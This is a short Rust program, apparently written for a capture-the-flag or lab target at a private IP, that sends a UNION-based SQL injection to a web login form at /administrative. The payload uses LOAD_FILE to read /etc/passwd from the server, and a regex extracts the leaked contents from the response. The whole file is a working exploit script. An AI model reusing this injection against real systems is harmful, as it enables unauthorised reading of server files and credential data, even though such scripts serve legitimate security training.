use regex::Regex;
use std::env;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // reading cli arguments
    let args: Vec<String> = env::args().collect();

    let c = reqwest::Client::new();

    // request data
    let data = [("uname", "admin' UNION SELECT 1,LOAD_FILE(\"/etc/passwd\"),3,4,5,6-- -"), ("password", "213")];

    let resp = c
        .post("http://10.10.11.101/administrative")
        .form(&data)
        .send()
        .await?
        .text()
        .await?;

    // println!("response: {}", resp);

    // regex
    let re = Regex::new(r"admin(.*\s)*</h3>").unwrap();
    let m = re.find(&resp).unwrap();
    println!("{}", m.as_str());
    Ok(())
}
